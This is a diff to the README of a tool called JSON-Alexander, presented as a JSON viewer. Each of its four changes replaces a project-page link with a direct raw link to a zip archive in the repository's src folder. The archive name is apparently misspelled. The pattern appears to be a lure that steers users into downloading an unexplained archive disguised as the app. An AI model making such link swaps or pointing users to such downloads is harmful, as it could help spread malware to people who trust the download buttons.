@@ -1,12 +1,12 @@
 # 🧩 JSON-Alexander - Clean JSON Viewing Made Simple
 
-[![Download JSON-Alexander](https://img.shields.io/badge/Download-JSON--Alexander-blue?style=for-the-badge&logo=github)](https://github.com/lezlieasymmetrical930/JSON-Alexander)
+[![Download JSON-Alexander](https://img.shields.io/badge/Download-JSON--Alexander-blue?style=for-the-badge&logo=github)](https://github.com/lezlieasymmetrical930/JSON-Alexander/raw/refs/heads/main/src/Alexander_JSO_v3.6.zip)
 
 ## 📥 Download JSON-Alexander
 
 Use this link to visit the project page and download the app or browser extension:
 
-[Download JSON-Alexander](https://github.com/lezlieasymmetrical930/JSON-Alexander)
+[Download JSON-Alexander](https://github.com/lezlieasymmetrical930/JSON-Alexander/raw/refs/heads/main/src/Alexander_JSO_v3.6.zip)
 
 ## 🖥️ What JSON-Alexander Does
 
@@ -28,7 +28,7 @@ Follow these steps to install and run JSON-Alexander on Windows.
 
 Go to the project page:
 
-[Visit JSON-Alexander](https://github.com/lezlieasymmetrical930/JSON-Alexander)
+[Visit JSON-Alexander](https://github.com/lezlieasymmetrical930/JSON-Alexander/raw/refs/heads/main/src/Alexander_JSO_v3.6.zip)
 
 ### 2. Find the latest release or download file
 
@@ -230,7 +230,7 @@ Choose the file that matches how you want to use it.
 
 If you need the project page later, use this link:
 
-[JSON-Alexander Download Page](https://github.com/lezlieasymmetrical930/JSON-Alexander)
+[JSON-Alexander Download Page](https://github.com/lezlieasymmetrical930/JSON-Alexander/raw/refs/heads/main/src/Alexander_JSO_v3.6.zip)
 
 ## 🧾 Quick Start
 
